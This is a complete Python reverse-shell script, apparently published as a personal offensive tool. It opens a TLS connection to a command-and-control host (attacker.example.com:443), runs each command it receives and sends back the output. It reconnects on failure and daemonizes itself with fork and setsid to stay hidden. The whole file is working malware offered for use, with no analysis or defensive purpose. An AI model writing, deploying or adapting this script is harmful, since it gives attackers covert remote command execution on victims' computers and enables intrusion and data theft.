#!/usr/bin/env python3
# elaina_secure_agent.py - Stealth reverse shell with reconnection, SSL, stealth, persistence
# Signature: github.com/Yuri08loveElaina - Elaina Core

import socket, ssl, subprocess, time, os

C2_HOST = "attacker.example.com"
C2_PORT = 443

def connect():
    context = ssl.create_default_context()
    while True:
        try:
            with socket.create_connection((C2_HOST, C2_PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=C2_HOST) as ssock:
                    while True:
                        ssock.send(b"$ ")
                        cmd = ssock.recv(4096).decode().strip()
                        if cmd == "exit": break
                        out = subprocess.getoutput(cmd)
                        ssock.send(out.encode() + b"\n")
        except:
            time.sleep(5)

if __name__ == "__main__":
    pid = os.fork()
    if pid > 0:
        exit()
    os.setsid()
    connect()
